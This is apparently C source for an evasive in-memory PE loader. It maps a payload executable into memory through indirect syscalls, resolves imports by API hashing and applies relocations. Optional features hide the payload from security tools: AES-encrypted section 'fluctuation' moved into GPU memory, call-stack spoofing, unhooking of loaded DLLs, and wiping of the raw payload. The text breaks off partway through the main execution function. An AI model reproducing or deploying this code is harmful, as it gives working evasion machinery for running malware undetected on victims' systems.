#include <Windows.h>
#include <intrin.h> 
#include <stdio.h>

#include "Structures.h"
#include "Utilities.h"
#include "TrapSyscallsTampering.h"
#include "UnpackAndHide.h"
#include "GpuManipulation.h"
#include "StackSpoofing.h"
#include "DebugMacros.h"
#include "DllsQueue.h"
#include "Configuration.h"


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

typedef struct _PE_PAYLOAD_CONFIG
{
	PIMAGE_DOS_HEADER		pImgDosHdr;
	PIMAGE_NT_HEADERS		pImgNtHdrs;
	PIMAGE_DATA_DIRECTORY	pImgImportDataDir;			// IMAGE_DIRECTORY_ENTRY_IMPORT
	PIMAGE_DATA_DIRECTORY	pImgTLSDataDir;				// IMAGE_DIRECTORY_ENTRY_TLS
	PIMAGE_DATA_DIRECTORY	pImgBaseRelocDataDir;		// IMAGE_DIRECTORY_ENTRY_BASERELOC
	PIMAGE_DATA_DIRECTORY	pImgExceptionDataDir;		// IMAGE_DIRECTORY_ENTRY_EXCEPTION
	PIMAGE_SECTION_HEADER	pImgSectionHdrs;			

} PE_PAYLOAD_CONFIG, * PPE_PAYLOAD_CONFIG;


typedef struct _GPU_SECTION
{
	DWORD       dwSectionMemProtection;
	ULONG_PTR   uSectionAddress;
	SIZE_T      cbSectionSize;

    VRAM_BLOB   pVramBlob;

} GPU_SECTION, * PGPU_SECTION;


typedef struct _PE_FLUCTUATION_CONFIG
{
	NTSTATUS		        STATUS; 
	ULONG_PTR		        uPeRuntimeAddress;   
	SIZE_T                  cbImageSize;
    HANDLE			        hTimerQueue;
    HANDLE			        hNewTimer;
	HANDLE			        hFluctuationVeh;
	BYTE 			        bAesKey[AES_KEY_IV_SIZE];
	BYTE 			        bAesIv[AES_KEY_IV_SIZE];
	
    PVOID                   pAddressOfEntryPoint;

    ID3D11Device*           pD3D11Device;
	ID3D11DeviceContext*    pD3D11DeviceContext;
    SIZE_T                  cbNumberOfGpuSection;  
    PGPU_SECTION            pGpuSections;

    PVOID                   pvSpoofDstStart;   
    PVOID                   pvRsp;

	CONTEXT                 pRegistersBackup;

    PVOID                   pvStackBase;
	PVOID                   pvStackLimit;
    PVOID                   pvBackupStack;

    THREAD_TO_SPOOF         ThreadToSpoof;
    BOOLEAN                 bIsStackSpoofed;
    CRITICAL_SECTION        csStackLock;
	HANDLE                  hThreadToSpoof;


} PE_FLUCTUATION_CONFIG, * PPE_FLUCTUATION_CONFIG;


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Global Variables

PE_FLUCTUATION_CONFIG   g_PeFluctuationConfig   = { 0 };
fnLdrLoadDll            g_pLdrLoadDll           = NULL;
const SIZE_T            g_kMinSlack             = 0x1000;

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Function Prototypes

static VOID CALLBACK ObfuscationTimerCallback(IN PVOID lpParameter, IN BOOLEAN TimerOrWaitFired);
static LONG WINAPI PeFluctuationVectoredHandler(IN PEXCEPTION_POINTERS pExceptionInfo);

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static VOID SecureCleanupPayloadConfig(IN PPE_PAYLOAD_CONFIG pPePayloadConfig)
{
    if (pPePayloadConfig == NULL)
        return;

    if (pPePayloadConfig->pImgDosHdr != NULL)
    {
        RtlSecureZeroMemory(pPePayloadConfig->pImgDosHdr, sizeof(IMAGE_DOS_HEADER));
        LocalFree(pPePayloadConfig->pImgDosHdr);
        pPePayloadConfig->pImgDosHdr = NULL;
    }

    if (pPePayloadConfig->pImgNtHdrs != NULL)
    {
        RtlSecureZeroMemory(pPePayloadConfig->pImgNtHdrs, sizeof(IMAGE_NT_HEADERS));
        LocalFree(pPePayloadConfig->pImgNtHdrs);
        pPePayloadConfig->pImgNtHdrs = NULL;
    }

    if (pPePayloadConfig->pImgSectionHdrs != NULL)
    {
        SIZE_T cbSectionHeadersSize = sizeof(IMAGE_SECTION_HEADER);
        if (pPePayloadConfig->pImgNtHdrs != NULL)
            cbSectionHeadersSize = pPePayloadConfig->pImgNtHdrs->FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER);

        RtlSecureZeroMemory(pPePayloadConfig->pImgSectionHdrs, cbSectionHeadersSize);
        LocalFree(pPePayloadConfig->pImgSectionHdrs);
        pPePayloadConfig->pImgSectionHdrs = NULL;
    }

    if (pPePayloadConfig->pImgImportDataDir != NULL)
    {
        RtlSecureZeroMemory(pPePayloadConfig->pImgImportDataDir, sizeof(IMAGE_DATA_DIRECTORY));
        LocalFree(pPePayloadConfig->pImgImportDataDir);
        pPePayloadConfig->pImgImportDataDir = NULL;
    }

    if (pPePayloadConfig->pImgTLSDataDir != NULL)
    {
        RtlSecureZeroMemory(pPePayloadConfig->pImgTLSDataDir, sizeof(IMAGE_DATA_DIRECTORY));
        LocalFree(pPePayloadConfig->pImgTLSDataDir);
        pPePayloadConfig->pImgTLSDataDir = NULL;
    }

    if (pPePayloadConfig->pImgBaseRelocDataDir != NULL)
    {
        RtlSecureZeroMemory(pPePayloadConfig->pImgBaseRelocDataDir, sizeof(IMAGE_DATA_DIRECTORY));
        LocalFree(pPePayloadConfig->pImgBaseRelocDataDir);
        pPePayloadConfig->pImgBaseRelocDataDir = NULL;
    }

    if (pPePayloadConfig->pImgExceptionDataDir != NULL)
    {
        RtlSecureZeroMemory(pPePayloadConfig->pImgExceptionDataDir, sizeof(IMAGE_DATA_DIRECTORY));
        LocalFree(pPePayloadConfig->pImgExceptionDataDir);
        pPePayloadConfig->pImgExceptionDataDir = NULL;
    }

    RtlSecureZeroMemory(pPePayloadConfig, sizeof(PE_PAYLOAD_CONFIG));
}

static BOOL InitializePayloadConfig(IN ULONG_PTR uPeAddress, IN SIZE_T cbPeSize, OUT PPE_PAYLOAD_CONFIG pPePayloadConfig)
{
    PIMAGE_DOS_HEADER       pImgDosHdr              = NULL;
    PIMAGE_NT_HEADERS       pImgNtHdrs              = NULL;
    PIMAGE_SECTION_HEADER   pImgSectionHdrs         = NULL;
    PIMAGE_DATA_DIRECTORY   pImgImportDataDir       = NULL;
    PIMAGE_DATA_DIRECTORY   pImgTLSDataDir          = NULL;
    PIMAGE_DATA_DIRECTORY   pImgBaseRelocDataDir    = NULL;
    PIMAGE_DATA_DIRECTORY   pImgExceptionDataDir    = NULL;
    WORD                    wNumberOfSections       = 0x00;

    pImgDosHdr = (PIMAGE_DOS_HEADER)uPeAddress;
    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    pImgNtHdrs = (PIMAGE_NT_HEADERS)(uPeAddress + pImgDosHdr->e_lfanew);
    if (!pImgNtHdrs || pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    pImgSectionHdrs         = IMAGE_FIRST_SECTION(pImgNtHdrs);
    wNumberOfSections       = pImgNtHdrs->FileHeader.NumberOfSections;
    pImgImportDataDir       = &pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    pImgTLSDataDir          = &pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    pImgBaseRelocDataDir    = &pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    pImgExceptionDataDir    = &pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];

    if (!pImgImportDataDir || !pImgTLSDataDir || !pImgBaseRelocDataDir || !pImgExceptionDataDir || !pImgSectionHdrs)
        return FALSE;

    pPePayloadConfig->pImgDosHdr = (PIMAGE_DOS_HEADER)LocalAlloc(LPTR, sizeof(IMAGE_DOS_HEADER));
    if (pPePayloadConfig->pImgDosHdr == NULL)
        goto _END_OF_FUNC;
    RtlCopyMemory(pPePayloadConfig->pImgDosHdr, pImgDosHdr, sizeof(IMAGE_DOS_HEADER));

    pPePayloadConfig->pImgNtHdrs = (PIMAGE_NT_HEADERS)LocalAlloc(LPTR, sizeof(IMAGE_NT_HEADERS));
    if (pPePayloadConfig->pImgNtHdrs == NULL)
        goto _END_OF_FUNC;
    RtlCopyMemory(pPePayloadConfig->pImgNtHdrs, pImgNtHdrs, sizeof(IMAGE_NT_HEADERS));

    SIZE_T cbSectionHeadersSize = wNumberOfSections * sizeof(IMAGE_SECTION_HEADER);
    pPePayloadConfig->pImgSectionHdrs = (PIMAGE_SECTION_HEADER)LocalAlloc(LPTR, cbSectionHeadersSize);
    if (pPePayloadConfig->pImgSectionHdrs == NULL)
        goto _END_OF_FUNC;
    RtlCopyMemory(pPePayloadConfig->pImgSectionHdrs, pImgSectionHdrs, cbSectionHeadersSize);

    pPePayloadConfig->pImgImportDataDir = (PIMAGE_DATA_DIRECTORY)LocalAlloc(LPTR, sizeof(IMAGE_DATA_DIRECTORY));
    if (pPePayloadConfig->pImgImportDataDir == NULL)
        goto _END_OF_FUNC;
    RtlCopyMemory(pPePayloadConfig->pImgImportDataDir, pImgImportDataDir, sizeof(IMAGE_DATA_DIRECTORY));

    pPePayloadConfig->pImgTLSDataDir = (PIMAGE_DATA_DIRECTORY)LocalAlloc(LPTR, sizeof(IMAGE_DATA_DIRECTORY));
    if (pPePayloadConfig->pImgTLSDataDir == NULL)
        goto _END_OF_FUNC;
    RtlCopyMemory(pPePayloadConfig->pImgTLSDataDir, pImgTLSDataDir, sizeof(IMAGE_DATA_DIRECTORY));

    pPePayloadConfig->pImgBaseRelocDataDir = (PIMAGE_DATA_DIRECTORY)LocalAlloc(LPTR, sizeof(IMAGE_DATA_DIRECTORY));
    if (pPePayloadConfig->pImgBaseRelocDataDir == NULL)
        goto _END_OF_FUNC;
    RtlCopyMemory(pPePayloadConfig->pImgBaseRelocDataDir, pImgBaseRelocDataDir, sizeof(IMAGE_DATA_DIRECTORY));

    pPePayloadConfig->pImgExceptionDataDir = (PIMAGE_DATA_DIRECTORY)LocalAlloc(LPTR, sizeof(IMAGE_DATA_DIRECTORY));
    if (pPePayloadConfig->pImgExceptionDataDir == NULL)
        goto _END_OF_FUNC;
    RtlCopyMemory(pPePayloadConfig->pImgExceptionDataDir, pImgExceptionDataDir, sizeof(IMAGE_DATA_DIRECTORY));

    return TRUE;

_END_OF_FUNC:
    SecureCleanupPayloadConfig(pPePayloadConfig);
    return FALSE;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

BOOL LoadDllViaLdr(IN LPSTR pszDllName, OUT PHANDLE phModule) 
{
    NTSTATUS        STATUS      = STATUS_SUCCESS;
    fnLdrLoadDll    pLdrLoadDll = NULL;
    UNICODE_STRING  usDllName   = { 0 };
    ANSI_STRING     asDllName   = { 0 };

    if (pszDllName == NULL) 
    {
        DBG_PRINT_A("[!] Invalid DLL Name Provided");
        return FALSE;
    }
    
    if ((pLdrLoadDll = InterlockedCompareExchangePointer((PVOID*)&g_pLdrLoadDll, NULL, NULL)) == NULL)
    {
        if (!(pLdrLoadDll = (fnLdrLoadDll)GetNtProcAddress(FNV1A_LdrLoadDll)))
            return FALSE;

        InterlockedExchangePointer((PVOID*)&g_pLdrLoadDll, (PVOID)pLdrLoadDll);
    }

    RtlInitAnsiString(&asDllName, pszDllName);

    if (!NT_SUCCESS((STATUS = RtlAnsiStringToUnicodeString(&usDllName, &asDllName, TRUE)))) 
    {
        DBG_PRINT_A("[!] RtlAnsiStringToUnicodeString Failed With Status: 0x%08X", STATUS);
        return FALSE;
    }

    if (!NT_SUCCESS((STATUS = pLdrLoadDll(NULL, NULL, &usDllName, phModule))))
    {
        DBG_PRINT_A("[!] LdrLoadDll Failed To Load %s With Status: 0x%08X", pszDllName, STATUS);
        RtlFreeUnicodeString(&usDllName);
        return FALSE;
    }

    DBG_PRINT_A("[v] Successfully Loaded %s At Base Address: 0x%p", pszDllName, *phModule);

    RtlFreeUnicodeString(&usDllName);
    return TRUE;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL ResolveImportAddressTable(IN PPE_PAYLOAD_CONFIG pPeConfig, IN ULONG_PTR uPeRuntimeAddress) 
{
	PIMAGE_IMPORT_DESCRIPTOR    pImgImportDes   = NULL;
    BOOL                        bIsPhase1       = IsQueueEmpty();

    if (bIsPhase1) InitializeDllQueue();

	for (SIZE_T i = 0; i < pPeConfig->pImgImportDataDir->Size; i += sizeof(IMAGE_IMPORT_DESCRIPTOR)) {

        pImgImportDes = (PIMAGE_IMPORT_DESCRIPTOR)(pPeConfig->pImgImportDataDir->VirtualAddress + uPeRuntimeAddress + i);

		if (pImgImportDes->OriginalFirstThunk == 0x00 && pImgImportDes->FirstThunk == 0x00)
			break;

		LPSTR       pszDllName      = (LPSTR)(uPeRuntimeAddress + pImgImportDes->Name);
		ULONG_PTR   uHead           = (ULONG_PTR)pImgImportDes->FirstThunk;
        ULONG_PTR   uNext           = (ULONG_PTR)pImgImportDes->OriginalFirstThunk;
        SIZE_T      cbHeadOffset    = 0x00;
        SIZE_T      cbNextOffset    = 0x00;
        HMODULE     hModule         = NULL;

        if (!(hModule = GetModuleHandleH(HASH_STRING_A_CI(pszDllName))))
        {
            if (!bIsPhase1) return FALSE;

            if (!EnqueueDllName(pszDllName))
            {
                DBG_PRINT_A("[!] Failed To Enqueue DLL: %s", pszDllName);
                return FALSE;
            }

            continue;
        }

        if (uNext == NULL) 
            uNext = pImgImportDes->FirstThunk;
        
        while (TRUE) {
            
            PIMAGE_THUNK_DATA       p1stThunk       = (PIMAGE_THUNK_DATA)(uPeRuntimeAddress + cbHeadOffset + uHead);
            PIMAGE_THUNK_DATA       pOrig1stThunk   = (PIMAGE_THUNK_DATA)(uPeRuntimeAddress + cbNextOffset + uNext);
            PIMAGE_IMPORT_BY_NAME   pFuncName       = NULL;
            ULONG_PTR               uFunction       = 00ULL;
            
            if (p1stThunk->u1.Function == NULL) {
                break;
            }
            
            if (pOrig1stThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) 
            {
                uFunction = (ULONG_PTR)GetProcAddressH(hModule, (DWORD)pOrig1stThunk->u1.Ordinal);
            }
            else 
            {
                pFuncName = (PIMAGE_IMPORT_BY_NAME)(uPeRuntimeAddress + pOrig1stThunk->u1.AddressOfData);
                uFunction = (ULONG_PTR)GetProcAddressH(hModule, HASH_STRING_A(pFuncName->Name));
            }
            
            if (uFunction == NULL) 
            {
				DBG_PRINT_A("[!] GetProcAddressH Failed To Resolve Function %s [%lu] With Error: %lu\n", 
					(pOrig1stThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) ? "(null)" : (LPCSTR)pFuncName->Name,
                    (ULONG)pOrig1stThunk->u1.Ordinal, GetLastError());

                return FALSE;
            }
            
            p1stThunk->u1.Function = (ULONGLONG)uFunction;
            
            cbHeadOffset += sizeof(IMAGE_THUNK_DATA);
            cbNextOffset += sizeof(IMAGE_THUNK_DATA);
        }
    }
    
    return TRUE;
}

static BOOL ResolvePeRelocation(IN ULONG_PTR uActualAddress, IN ULONG_PTR uPreferableAddress, IN PIMAGE_BASE_RELOCATION pBaseRelocDir)
{
    PIMAGE_BASE_RELOCATION  pImgBaseReloc   = pBaseRelocDir;
    ULONG_PTR               uOffsetDelta    = uActualAddress - uPreferableAddress;
    PBASE_RELOCATION_ENTRY  pBaseReloc      = NULL;

    while (pImgBaseReloc->VirtualAddress != 0x00) 
    {
        pBaseReloc = (PBASE_RELOCATION_ENTRY)(pImgBaseReloc + 1);

        while ((PBYTE)pBaseReloc != (PBYTE)pImgBaseReloc + pImgBaseReloc->SizeOfBlock) {

            switch (pBaseReloc->Type) {
                case IMAGE_REL_BASED_DIR64:
                    *((ULONG_PTR*)(uActualAddress + pImgBaseReloc->VirtualAddress + pBaseReloc->Offset)) += uOffsetDelta;
                    break;
                case IMAGE_REL_BASED_HIGHLOW:
                    *((DWORD*)(uActualAddress + pImgBaseReloc->VirtualAddress + pBaseReloc->Offset)) += (DWORD)uOffsetDelta;
                    break;
                case IMAGE_REL_BASED_HIGH:
                    *((WORD*)(uActualAddress + pImgBaseReloc->VirtualAddress + pBaseReloc->Offset)) += HIWORD(uOffsetDelta);
                    break;
                case IMAGE_REL_BASED_LOW:
                    *((WORD*)(uActualAddress + pImgBaseReloc->VirtualAddress + pBaseReloc->Offset)) += LOWORD(uOffsetDelta);
                    break;
                case IMAGE_REL_BASED_ABSOLUTE:
                    break;
                default:
                    DBG_PRINT_A("[!] Unknown Relocation Type: 0x%08X ", pBaseReloc->Offset);
                    return FALSE;
            }

            pBaseReloc++;
        }

        pImgBaseReloc = (PIMAGE_BASE_RELOCATION)pBaseReloc;
    }

    return TRUE;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

#ifdef UNHOOK_LOADED_DLLS
extern BOOL UnhookLoadedDlls();
#endif // UNHOOK_LOADED_DLLS

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

DWORD WINAPI ExecutePePayload(IN ULONG_PTR uRawPeAddress, IN SIZE_T cbPeSize)
{

	PE_PAYLOAD_CONFIG   pPePayloadConfig    = { 0 };
    NTSTATUS			STATUS              = STATUS_SUCCESS;
    PVOID		        pRunPeBaseAddress   = NULL;
    SIZE_T		        cbRegionSize        = 0x00;
    HANDLE              hThread             = NULL;
    DWORD               dwThreadId          = 0x00,
                        dwThreadExitCode    = 0x00;
	CONTEXT			    ThreadCtx           = { 0 };     

#ifdef GPU_SECTIONS_FLUCTUATION
    if (!InitializeD3D11Device(&g_PeFluctuationConfig.pD3D11Device, &g_PeFluctuationConfig.pD3D11DeviceContext, 0))
		return FAILED_EXECUTION;
#endif // GPU_SECTIONS_FLUCTUATION

    if (!InitializePayloadConfig(uRawPeAddress, cbPeSize, &pPePayloadConfig))
        return FAILED_EXECUTION;

#ifdef STACK_SPOOFING

    if (!InitialiseDynamicCallStackSpoofing(UserRequest, &g_PeFluctuationConfig.ThreadToSpoof))
        return FAILED_EXECUTION;

    if (!(g_PeFluctuationConfig.pvBackupStack = LocalAlloc(LPTR, g_PeFluctuationConfig.ThreadToSpoof.cbTotalRequiredStackSize))) 
    {
		DBG_PRINT_A("[!] LocalAlloc Failed With Error: %lu", GetLastError());
        return FAILED_EXECUTION;
    }

    InitializeCriticalSection(&g_PeFluctuationConfig.csStackLock);

#endif // STACK_SPOOFING

	// Populate AES's Key and IV
    for (int i = 0; i < AES_KEY_IV_SIZE; i++)
        g_PeFluctuationConfig.bAesKey[i] = GenRandomByte();

    for (int i = 0; i < AES_KEY_IV_SIZE; i++)
        g_PeFluctuationConfig.bAesIv[i] = GenRandomByte();

	DBG_PRINT_A("[v] Generated AES Key & IV For Section Fluctuation");
    
    if (!(g_PeFluctuationConfig.hFluctuationVeh = AddVectoredExceptionHandler(0x01, PeFluctuationVectoredHandler)))
    {
		DBG_PRINT_A("[!] AddVectoredExceptionHandler Failed With Error: %lu", GetLastError());
		return FAILED_EXECUTION;
    }

    if (!(g_PeFluctuationConfig.hTimerQueue = CreateTimerQueue())) 
    {
		DBG_PRINT_A("[!] CreateTimerQueue Failed With Error: %lu", GetLastError());
		return FAILED_EXECUTION;
    }

	DBG_PRINT_A("[v] Created Timer Queue For Section Fluctuation");


	pRunPeBaseAddress   = (PVOID)(pPePayloadConfig.pImgNtHdrs->OptionalHeader.ImageBase);
    cbRegionSize        = pPePayloadConfig.pImgNtHdrs->OptionalHeader.SizeOfImage;

	DBG_PRINT_A("[v] Attempting To Allocate Memory At Preferred Image Base: 0x%p ", pRunPeBaseAddress);

    INVOKE_SYSCALL(FNV1A_NtAllocateVirtualMemory, STATUS, NtGetCurrentProcess(), &pRunPeBaseAddress, 0x00, &cbRegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(STATUS))
    {
        DBG_PRINT_A("[-] NtAllocateVirtualMemory Failed With Status: 0x%08X", STATUS);

		pRunPeBaseAddress   = NULL;
		cbRegionSize        = pPePayloadConfig.pImgNtHdrs->OptionalHeader.SizeOfImage;

        INVOKE_SYSCALL(FNV1A_NtAllocateVirtualMemory, STATUS, NtGetCurrentProcess(), &pRunPeBaseAddress, 0x00, &cbRegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!NT_SUCCESS(STATUS))
        {
            DBG_PRINT_A("[!] NtAllocateVirtualMemory Failed With Status: 0x%08X", STATUS);
			return FAILED_EXECUTION;
        }
    }

	DBG_PRINT_A("[+] Allocated Memory At: 0x%p ", pRunPeBaseAddress);
	DBG_PRINT_A("[i] Image Size: %lu ", pPePayloadConfig.pImgNtHdrs->OptionalHeader.SizeOfImage);
	DBG_PRINT_A("[i] Preferred Image Base: 0x%p ", (PVOID)pPePayloadConfig.pImgNtHdrs->OptionalHeader.ImageBase);

    g_PeFluctuationConfig.uPeRuntimeAddress     = (ULONG_PTR)pRunPeBaseAddress;
    g_PeFluctuationConfig.cbImageSize           = cbRegionSize;
    g_PeFluctuationConfig.cbNumberOfGpuSection  = pPePayloadConfig.pImgNtHdrs->FileHeader.NumberOfSections;
    g_PeFluctuationConfig.pGpuSections          = (PGPU_SECTION)LocalAlloc(LPTR, g_PeFluctuationConfig.cbNumberOfGpuSection * sizeof(GPU_SECTION));

    if (!g_PeFluctuationConfig.pGpuSections)
    {
		DBG_PRINT_A("[!] LocalAlloc Failed With Error: %lu", GetLastError());
        return FAILED_EXECUTION;
	}

    //
    for (int i = 0; i < pPePayloadConfig.pImgNtHdrs->FileHeader.NumberOfSections; i++)
    {
        RtlCopyMemory
        (
            (PVOID)((ULONG_PTR)pRunPeBaseAddress + pPePayloadConfig.pImgSectionHdrs[i].VirtualAddress),
            (PVOID)(uRawPeAddress + pPePayloadConfig.pImgSectionHdrs[i].PointerToRawData),
            pPePayloadConfig.pImgSectionHdrs[i].SizeOfRawData
        );

		g_PeFluctuationConfig.pGpuSections[i].uSectionAddress   = (ULONG_PTR)((ULONG_PTR)pRunPeBaseAddress + pPePayloadConfig.pImgSectionHdrs[i].VirtualAddress);
		g_PeFluctuationConfig.pGpuSections[i].cbSectionSize     = (SIZE_T)pPePayloadConfig.pImgSectionHdrs[i].SizeOfRawData;

#ifdef GPU_SECTIONS_FLUCTUATION

        if (!CreateVramBlob(g_PeFluctuationConfig.pD3D11Device, (DWORD)g_PeFluctuationConfig.pGpuSections[i].cbSectionSize, &g_PeFluctuationConfig.pGpuSections[i].pVramBlob))
        {
            DBG_PRINT_A("[!] CreateVramBlob Failed With Error: %lu", GetLastError());
			return FAILED_EXECUTION;
        }

		DBG_PRINT_A("[*] Allocated VRAM Blob For Section %.8s Of Size: %lu ", pPePayloadConfig.pImgSectionHdrs[i].Name, pPePayloadConfig.pImgSectionHdrs[i].SizeOfRawData);
#endif

    }

    // 
    RtlSecureZeroMemory((PVOID)uRawPeAddress, cbPeSize);

    //
    for (DWORD i = 0; i < pPePayloadConfig.pImgNtHdrs->FileHeader.NumberOfSections; i++) 
    {
        DWORD   dwMemProtection     = 0x00;
        PVOID   pMemAddress         = (PVOID)((ULONG_PTR)pRunPeBaseAddress + pPePayloadConfig.pImgSectionHdrs[i].VirtualAddress);

        if (pPePayloadConfig.pImgSectionHdrs[i].Characteristics & IMAGE_SCN_MEM_WRITE)
            dwMemProtection = PAGE_WRITECOPY;

        if (pPePayloadConfig.pImgSectionHdrs[i].Characteristics & IMAGE_SCN_MEM_READ)
            dwMemProtection = PAGE_READONLY;

        if ((pPePayloadConfig.pImgSectionHdrs[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pPePayloadConfig.pImgSectionHdrs[i].Characteristics & IMAGE_SCN_MEM_READ))
            dwMemProtection = PAGE_READWRITE;

        if (pPePayloadConfig.pImgSectionHdrs[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
            dwMemProtection = PAGE_EXECUTE;

        if ((pPePayloadConfig.pImgSectionHdrs[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pPePayloadConfig.pImgSectionHdrs[i].Characteristics & IMAGE_SCN_MEM_WRITE))
            dwMemProtection = PAGE_EXECUTE_WRITECOPY;

        if ((pPePayloadConfig.pImgSectionHdrs[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pPePayloadConfig.pImgSectionHdrs[i].Characteristics & IMAGE_SCN_MEM_READ))
            dwMemProtection = PAGE_EXECUTE_READ;

        if ((pPePayloadConfig.pImgSectionHdrs[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pPePayloadConfig.pImgSectionHdrs[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pPePayloadConfig.pImgSectionHdrs[i].Characteristics & IMAGE_SCN_MEM_READ))
            dwMemProtection = PAGE_EXECUTE_READWRITE;

        if (pMemAddress == (PVOID)g_PeFluctuationConfig.pGpuSections[i].uSectionAddress)
            g_PeFluctuationConfig.pGpuSections[i].dwSectionMemProtection = dwMemProtection;
    }

    //
    if (!ResolveImportAddressTable(&pPePayloadConfig, (ULONG_PTR)pRunPeBaseAddress))
    {
        return FAILED_EXECUTION;
	}

    //
    SortDllQueueAlphabetically();

    //
    while(1)
    {
		LPSTR   pszDllName  = DequeueDllName();
		HMODULE hModule     = NULL;
        
		if (!pszDllName) break;

        if (!(hModule = GetModuleHandleH(HASH_STRING_A_CI(pszDllName))))
        {
            if (!LoadDllViaLdr(pszDllName, &hModule))
            {
                DBG_PRINT_A("[!] LoadDllViaLdr Failed To Load %s", pszDllName);
                LocalFree(pszDllName);
                return FAILED_EXECUTION;
            }
		}

        LocalFree(pszDllName);
    }

    //
    if (!ResolveImportAddressTable(&pPePayloadConfig, (ULONG_PTR)pRunPeBaseAddress))
    {
        return FAILED_EXECUTION;
    }
   
    //
    if (pRunPeBaseAddress != (PVOID)pPePayloadConfig.pImgNtHdrs->OptionalHeader.ImageBase)
    {
        if (!ResolvePeRelocation((ULONG_PTR)pRunPeBaseAddress, pPePayloadConfig.pImgNtHdrs->OptionalHeader.ImageBase, (PIMAGE_BASE_RELOCATION)((ULONG_PTR)pRunPeBaseAddress + pPePayloadConfig.pImgBaseRelocDataDir->VirtualAddress)))
        {
            return FAILED_EXECUTION;
        }
	}

    //
    if (!CreateTimerQueueTimer(&g_PeFluctuationConfig.hNewTimer, g_PeFluctuationConfig.hTimerQueue, (WAITORTIMERCALLBACK)ObfuscationTimerCallback, NULL, 10, 0x00, 0x00))
    {
        DBG_PRINT_A("[!] CreateTimerQueueTimer Failed With Error: %lu", GetLastError());
        return FAILED_EXECUTION;
    }

    //
    LARGE_INTEGER DueTime = { 0 };
    DueTime.QuadPart = -10000000LL * 20; // 20 seconds
	INVOKE_SYSCALL(FNV1A_NtWaitForSingleObject, STATUS, NtGetCurrentThread(), FALSE, &DueTime);
    /*
    StartCountingPrimes(20);
    */
    
#ifdef UNHOOK_LOADED_DLLS
    UnhookLoadedDlls();
#endif // UNHOOK_LOADED_DLLS

    //
    if (pPePayloadConfig.pImgExceptionDataDir->VirtualAddress != 0x00 && pPePayloadConfig.pImgExceptionDataDir->Size != 0x00)
    {
        PIMAGE_RUNTIME_FUNCTION_ENTRY   pImgRunFuncEntry        = (PIMAGE_RUNTIME_FUNCTION_ENTRY)((ULONG_PTR)pRunPeBaseAddress + pPePayloadConfig.pImgExceptionDataDir->VirtualAddress);
        HMODULE                         hKernel32               = GetModuleHandleH(FNV1A_KERNEL32);
        fnRtlAddFunctionTable           pRtlAddFunctionTable    = (fnRtlAddFunctionTable)GetProcAddressH(hKernel32, FNV1A_RtlAddFunctionTable);

        if (pRtlAddFunctionTable)
        {
            if (!pRtlAddFunctionTable(pImgRunFuncEntry, (pPePayloadConfig.pImgExceptionDataDir->Size / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY)) - 1, (DWORD64)pRunPeBaseAddress))
            {
                DBG_PRINT_A("[!] RtlAddFunctionTable Failed With Error: %lu", GetLastError());
                return FAILED_EXECUTION;
            }
        }
    }

    // 
    if (pPePayloadConfig.pImgTLSDataDir->VirtualAddress != 0x00 && pPePayloadConfig.pImgTLSDataDir->Size != 0x00)
    {
        PIMAGE_TLS_DIRECTORY     pImgTlsDir      = (PIMAGE_TLS_DIRECTORY)((ULONG_PTR)pRunPeBaseAddress + pPePayloadConfig.pImgTLSDataDir->VirtualAddress);
